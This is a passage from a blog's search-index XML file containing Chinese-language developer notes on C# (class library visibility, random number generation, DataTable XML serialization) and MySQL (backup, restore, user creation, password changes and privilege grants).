{           }           Thread.Sleep(1000);         }        })  { IsBackground = true }.Start();#endregion3 C#中无法引用自己创建的类库中的类3.1 问题描述新建一个类，定义了一些方法，在外部引用该类时，不能引用。3.2 解决办法1.检查类前面有没有添加加或使用public。2.类中定义的方法也应该是public类型的3.改完之后将该类库重新生成一次4.注意类名不要与系统保留字冲突3.3 参考资料https://www.ezloo.com/2008/10/classlibrary_visited.html4 获取指定范围的n个随机数#region &#38543;&#26426;&#25968;&#33719;&#21462;        /**         * &#33719;&#21462;&#35268;&#23450;&#33539;&#22260;&#20869;&#30340;n&#20010;&#38543;&#26426;&#25968;         *          * min_value    int    &#38543;&#26426;&#25968;&#19979;&#38480;         * max_value    int    &#38543;&#26426;&#25968;&#19978;&#38480;         * number       int    &#38543;&#26426;&#25968;&#37327;         */        private string getRandom(int min_value, int max_value, int number)        {            Random random = new Random();            ArrayList arr = new ArrayList();            int temp = 0;            for (int i = 0; i &lt; number; i++)            {                temp = random.Next(min_value, max_value); //&#38543;&#26426;&#21462;&#25968;                arr.Add(temp);            }            string str = "";            for (int j = 0; j &lt; arr.Count; j++)            {                str += arr[j].ToString() + ",";                //Console.Write(arr[j].ToString());            }            return str.Substring(0, str.LastIndexOf(","));        }#endregion5 DataTable 序列化/// &lt;summary&gt;/// &#24207;&#21015;&#21270;DataTable&#25104;XML/// &lt;/summary&gt;/// &lt;param name="dt"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;private static string SerializeDataTableToXml(DataTable dt){    StringBuilder strBuilder = new StringBuilder();    XmlWriter writer = XmlWriter.Create(strBuilder);    XmlSerializer serializer = new XmlSerializer(typeof(DataTable));    serializer.Serialize(writer, dt);    writer.Close();    return strBuilder.ToString();}/// &lt;summary&gt;/// &#24207;&#21015;&#21270;XML&#25104;DataTable/// &lt;/summary&gt;/// &lt;param name="xml"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;private static DataTable SerializeXmlToDataTable(string xml){    StringReader strReader = new StringReader(xml);    XmlReader xmlReader = XmlReader.Create(strReader);    XmlSerializer serializer = new XmlSerializer(typeof(DataTable));    DataTable dt = serializer.Deserialize(xmlReader) as DataTable;    return dt;}DMWebSvrSoapClient dmwss = new DMWebSvrSoapClient();DateTime date = DateTime.Now;string dataStr1 = dmwss.GetVehicleInfo_Month(date.ToString("yyyy-MM-dd"));XmlDocument xmldoc = new XmlDocument();xmldoc.LoadXml(dataStr1);XmlNodeList xnList = xmldoc.SelectNodes("//DocumentElement/list");foreach (XmlNode xn in xnList){     ListViewItem item = new ListViewItem(xn["time"].InnerText);     item.SubItems.Add(xn["in_vehicle_count"].InnerText);     item.SubItems.Add(xn["out_vehicle_count"].InnerText);     listView.Items.Add(item);}5.1 参考资料http://stackoverflow.com/questions/6402596/xml-string-to-xml-documenthttps://zhidao.baidu.com/question/574030822.htmlhttps://msdn.microsoft.com/en-us/library/hcebdtae(v=vs.110).aspx]]></content>
      <categories>
        
          <category> c# </category>
        
      </categories>
      <tags>
        
          <tag> C# </tag>
        
          <tag> ASP.NET </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[MySQL 使用笔记]]></title>
      <url>/database/2013/12/13/mysql-notes/</url>
      <content type="text"><![CDATA[1 MySQL备份与还原1.1 备份$mysqldump -u username -p dbname&gt;filename.sql输入密码//单独备份指定表$mysqldump -u username -p dbname table1 table2&gt;filename.sql输入密码//加条件备份指定表(注意单引号和双引号问题)$mysqldump -u username -p dbname table1 table2 -w "id&lt;10"&gt;filename.sql//执行SQL语句将查到的数据导出到文件$mysql -u gcoin -p -Ne "use gold;select * from ecs_user" &gt; ~/outfile.txt1.2 还原1.2.1 Windows&gt;mysql -u username -p 输入密码&gt;create database dbname&gt;use dbname&gt;source filename.sql1.2.2 Linux$mysql -u username -p dbname&lt;filename.sql1.3 当没有备份数据库(mysql)时,恢复数据库办法1.3.1 描述一次误操作导致系统崩溃了，数据库没来得及备份，重装系统后，进入D盘发现mysql/data目录下仍然存留frm文件和ibd文件（注意：我的www目录存在了D盘，也就是非系统盘）。此时，你应该这样做...1.3.2 具体步骤a.进入mysql/data目录下，将存留的frm和ibd文件拷贝。b.放到同样环境的mysql/data目录下。启动msyql，查看结果。2 MySQL用户与权限2.1 新建用户示例：新建一个名为admin密码为123456的用户，建议方式2： --方法1： &gt;insert into mysql.user(Host,User,Password)values("192.168.120.110","sa",password("123456")); &gt;flush privileges; --方法2： &gt; create user admin@localhost identified by 'admins_password'; 2.2 修改指定用户的密码&gt;update mysql.user set password=password('123456') where User="admin" and Host="localhost";//适用于mysql5.7.6以前版本 &gt;update mysql.user set authentication_string=password('密码') where user='admin' and Host = 'localhost'; 或者 set password for 'admin'@'localhost'=password('密码');//适用于5.7.6以后版本 &gt;flush privileges; 下面是另一种方法： &gt;mysqladmin -u root -p password 'root' &gt;history -c //清除历史 2.3 给用户授权示例：授予用户admin全部权限，并允许该用户通过外部访问 &gt;GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' identified by '123456' with grant option; &gt;flush privileges;  //刷新系统权限表 示例：授权用户admin仅拥有数据库estep的所有权限允许本地访问： &gt;GRANT ALL PRIVILEGES ON estep.* TO 'admin'@'127.0.0.1' identified by '123456' with grant option; &gt;flush privileges;  //刷新系统权限表 示例：指定数据库estep的部分权限给用户admin： &gt;grant select,update on estep.* to 'admin'@'localhost' identified by '123456'; &gt;flush privileges;  //刷新系统权限表 ]]></content>
      <categories>
        
          <category> database </category>
        
      </categories>
      <tags>
        
          <tag> MySQL </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[IIS, Internet Information Services]]></title>
      <url>/software/web-server/2013/05/02/iis/</url>
      <content type="text"><![CDATA[1 IIS 简介]]></content>
      <categories>
        
          <category> software </category>
        
          <category> web-server </category>
        
      </categories>
      <tags>
        
          <tag> IIS </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
